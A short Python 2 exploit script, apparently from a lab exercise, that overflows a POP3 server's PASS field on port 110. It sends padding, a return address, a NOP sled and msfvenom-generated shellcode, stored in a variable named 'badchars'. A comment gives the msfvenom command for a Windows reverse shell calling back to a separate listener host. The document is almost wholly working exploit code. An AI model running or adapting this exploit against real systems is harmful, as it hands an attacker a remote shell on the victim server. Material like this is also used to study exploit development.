#!/usr/bin/env python

import socket

#msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.244.129 LPORT=4444 -f c

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

badchars = (
"\xbd\x3c\xdb\x1e\x6e\xd9\xf7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x6a\x12\x83\xc2\x04\x03\x56\xd5\xfc\x9b\x5a\x01\x82"
"\x64\xa2\xd2\xe3\xed\x47\xe3\x23\x89\x0c\x54\x94\xd9\x40\x59"
"\x5f\x8f\x70\xea\x2d\x18\x77\x5b\x9b\x7e\xb6\x5c\xb0\x43\xd9"
"\xde\xcb\x97\x39\xde\x03\xea\x38\x27\x79\x07\x68\xf0\xf5\xba"
"\x9c\x75\x43\x07\x17\xc5\x45\x0f\xc4\x9e\x64\x3e\x5b\x94\x3e"
"\xe0\x5a\x79\x4b\xa9\x44\x9e\x76\x63\xff\x54\x0c\x72\x29\xa5"
"\xed\xd9\x14\x09\x1c\x23\x51\xae\xff\x56\xab\xcc\x82\x60\x68"
"\xae\x58\xe4\x6a\x08\x2a\x5e\x56\xa8\xff\x39\x1d\xa6\xb4\x4e"
"\x79\xab\x4b\x82\xf2\xd7\xc0\x25\xd4\x51\x92\x01\xf0\x3a\x40"
"\x2b\xa1\xe6\x27\x54\xb1\x48\x97\xf0\xba\x65\xcc\x88\xe1\xe1"
"\x21\xa1\x19\xf2\x2d\xb2\x6a\xc0\xf2\x68\xe4\x68\x7a\xb7\xf3"
"\x8f\x51\x0f\x6b\x6e\x5a\x70\xa2\xb5\x0e\x20\xdc\x1c\x2f\xab"
"\x1c\xa0\xfa\x7c\x4c\x0e\x55\x3d\x3c\xee\x05\xd5\x56\xe1\x7a"
"\xc5\x59\x2b\x13\x6c\xa0\xbc\xdc\xd9\x5e\xbd\xb5\x1b\x9e\xaf"
"\x19\x95\x78\xa5\xb1\xf3\xd3\x52\x2b\x5e\xaf\xc3\xb4\x74\xca"
"\xc4\x3f\x7b\x2b\x8a\xb7\xf6\x3f\x7b\x38\x4d\x1d\x2a\x47\x7b"
"\x09\xb0\xda\xe0\xc9\xbf\xc6\xbe\x9e\xe8\x39\xb7\x4a\x05\x63"
"\x61\x68\xd4\xf5\x4a\x28\x03\xc6\x55\xb1\xc6\x72\x72\xa1\x1e"
"\x7a\x3e\x95\xce\x2d\xe8\x43\xa9\x87\x5a\x3d\x63\x7b\x35\xa9"
"\xf2\xb7\x86\xaf\xfa\x9d\x70\x4f\x4a\x48\xc5\x70\x63\x1c\xc1"
"\x09\x99\xbc\x2e\xc0\x19\xdc\xcc\xc0\x57\x75\x49\x81\xd5\x18"
"\x6a\x7c\x19\x25\xe9\x74\xe2\xd2\xf1\xfd\xe7\x9f\xb5\xee\x95"
"\xb0\x53\x10\x09\xb0\x71")

buffer1 = "A" * 2606 +  "\x63\x79\x4b\x5f" + "\x90" * 12 + badchars
ip = "192.168.244.137"
port = 110

sock.connect((ip,port))

banner = sock.recv(1024)
print banner

pass1 = "PASS " + buffer1 + "\r\n"
sock.send("USER alpha\r\n")
sock.send(pass1)

banner_1 = sock.recv(1024)
print banner_1

sock.close()
